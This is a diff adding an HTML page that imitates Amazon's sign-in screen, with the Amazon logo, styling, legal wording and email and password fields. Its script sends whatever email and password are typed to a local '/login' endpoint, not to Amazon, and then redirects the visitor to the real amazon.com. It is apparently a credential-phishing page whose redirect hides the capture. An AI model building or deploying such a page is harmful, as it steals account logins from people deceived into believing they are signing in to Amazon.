@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign-In</title>
+    <style>
+        body {
+            font-family: "Amazon Ember", Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 20px;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            height: 31px;
+        }
+        .container {
+            width: 350px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 20px 26px;
+        }
+        h1 {
+            font-weight: 400;
+            font-size: 28px;
+            line-height: 1.2;
+            margin-bottom: 10px;
+        }
+        label {
+            display: block;
+            font-weight: 700;
+            font-size: 13px;
+            margin-bottom: 5px;
+            margin-top: 10px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #a6a6a6;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+        input[type="email"]:focus, input[type="password"]:focus {
+            border-color: #e77600;
+            box-shadow: 0 0 3px 2px rgba(228, 121, 17, .5);
+            outline: none;
+        }
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid;
+            border-color: #a88734 #9c7e31 #846a29;
+            border-radius: 3px;
+            cursor: pointer;
+            padding: 6px;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+        .submit-btn:hover {
+            background: linear-gradient(to bottom, #f5d78e, #eeb933);
+        }
+        .legal {
+            font-size: 12px;
+            margin-top: 20px;
+            line-height: 1.5;
+            color: #111;
+        }
+        .legal a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        .legal a:hover {
+            text-decoration: underline;
+            color: #c45500;
+        }
+        .new-to {
+            text-align: center;
+            margin-top: 20px;
+            position: relative;
+        }
+        .new-to::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            border-top: 1px solid #e7e7e7;
+            z-index: -1;
+        }
+        .new-to span {
+            background: #fff;
+            padding: 0 10px;
+            color: #767676;
+            font-size: 12px;
+        }
+        .create-btn {
+            display: block;
+            width: 350px;
+            text-align: center;
+            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
+            border: 1px solid;
+            border-color: #adb1b8 #a2a6ac #8d9096;
+            border-radius: 3px;
+            padding: 6px;
+            margin-top: 10px;
+            font-size: 13px;
+            color: #111;
+            text-decoration: none;
+        }
+        .create-btn:hover {
+            background: linear-gradient(to bottom, #e7eaf0, #d9dce1);
+        }
+    </style>
+    <script>
+        async function handleLogin(event) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+            
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    window.location.href = "https://www.amazon.com";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/500px-Amazon_logo.svg.png" alt="Amazon">
+    </div>
+    <div class="container">
+        <h1>Sign in</h1>
+        <form id="login-form" onsubmit="handleLogin(event)">
+            <label for="email">Email or mobile phone number</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit" class="submit-btn">Sign in</button>
+            
+            <div class="legal">
+                By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+            </div>
+            
+            <div class="legal" style="margin-top: 20px;">
+                <a href="#">Need help?</a>
+            </div>
+        </form>
+    </div>
+    
+    <div class="new-to">
+        <span>New to Amazon?</span>
+    </div>
+    
+    <a href="#" class="create-btn">Create your Amazon account</a>
+</body>
+</html>
